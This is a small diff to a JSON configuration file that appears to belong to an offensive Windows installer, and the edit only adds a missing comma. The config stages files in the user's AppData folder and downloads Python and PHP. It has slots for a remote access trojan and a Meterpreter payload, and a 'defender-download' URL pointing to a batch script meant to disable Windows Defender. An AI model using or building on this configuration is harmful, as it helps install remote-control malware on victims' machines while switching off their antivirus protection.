@@ -2,7 +2,7 @@
   {
     "setup-path": "C:/Users/^USERNAME^/AppData/Roaming/test",
     "python-download": "https://www.python.org/ftp/python/3.10.7/python-3.10.7-embed-win32.zip",
-    "php-download": "https://windows.php.net/downloads/releases/php-7.4.30-Win32-vc15-x86.zip"
+    "php-download": "https://windows.php.net/downloads/releases/php-7.4.30-Win32-vc15-x86.zip",
     "rat-download": "",
     "meterpreter-download": "",
     "defender-download": "https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2.0/main/Defeat-Defender.bat"
